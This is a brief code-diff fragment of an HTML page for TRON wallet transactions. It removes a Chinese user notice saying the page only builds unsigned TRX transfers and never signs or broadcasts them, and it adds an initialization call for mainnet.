-  notice: "请先点击“读取已连接钱包地址”，再点击“生成标准未签名 TRX 转账交易”。本页面不会签名或广播。"
-}, null, 2);
+    // 初始化
+    initTronWeb('mainnet');
 </script>
+
 </body>
 </html>
